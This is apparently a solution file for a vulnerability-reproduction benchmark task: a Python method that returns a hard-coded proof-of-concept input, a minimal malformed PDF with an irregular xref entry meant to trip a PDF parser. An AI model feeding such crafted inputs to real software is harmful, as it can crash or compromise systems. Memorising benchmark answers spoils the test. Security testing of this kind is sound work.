class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%PDF-1.4\nxref\n0 1\n0000000000 00000 00000000000\r\n'
        return poc
